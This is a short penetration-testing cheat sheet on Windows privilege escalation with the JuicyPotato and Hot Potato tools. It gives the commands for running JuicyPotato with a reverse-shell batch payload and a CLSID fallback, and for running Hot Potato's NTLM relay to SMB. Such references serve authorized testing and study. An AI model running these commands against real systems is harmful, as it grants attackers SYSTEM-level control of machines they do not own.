---
description: JuicyPotato and HotPotato
---

# Juicy & Hot Potato

> Service accounts can lead to SYSTEM if they have SeAssignPrimaryTokenPrivilege or SetImpersonatePrivilege privileges enable (whoami /priv).

### JuicyPotato

**Step 1:** Upload [JuicyPotato](https://github.com/ohpe/juicy-potato/releases) to the machine:

**Step 2:** Execute the binary with the following flags:

```
JuicyPotato.exe -l 9999 -p C:\temp\1.bat -t *
#-l: port to listen (can be random)
#-p: payload to use (a reverse shell)
#-t: technique used (*) for use all.
```

If the above method doesn't work (automatic using BITS), use a CLSID as shown in the following command:

```
JuicyPotato.exe -l 9999 -p C:\temp\1.bat -t * -c '{$CLSID}'
#Change $CLSID with any correct OS CLSID.
```

List of [CLSID's](https://ohpe.it/juicy-potato/CLSID/).

### Hot Potato

This attack tricks Windows into authenticating as the SYSTEM user to a fake http server using NTLM. The NTLM credentials then get relayed to SMB in order to gain command execution.

**Note:** Patched on latest versions of w10.

{% code overflow="wrap" %}
```powershell
PS> .\potato.exe -ip $CURRENTWINDOWSIP -cmd "C:\XX\xx.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true

```
{% endcode %}

### References

* [ohpe](https://github.com/ohpe/juicy-potato)
* [0x1 Gitlab](https://0x1.gitlab.io/exploit/Windows-Privilege-Escalation/#juicy-potato-abusing-the-golden-privileges)
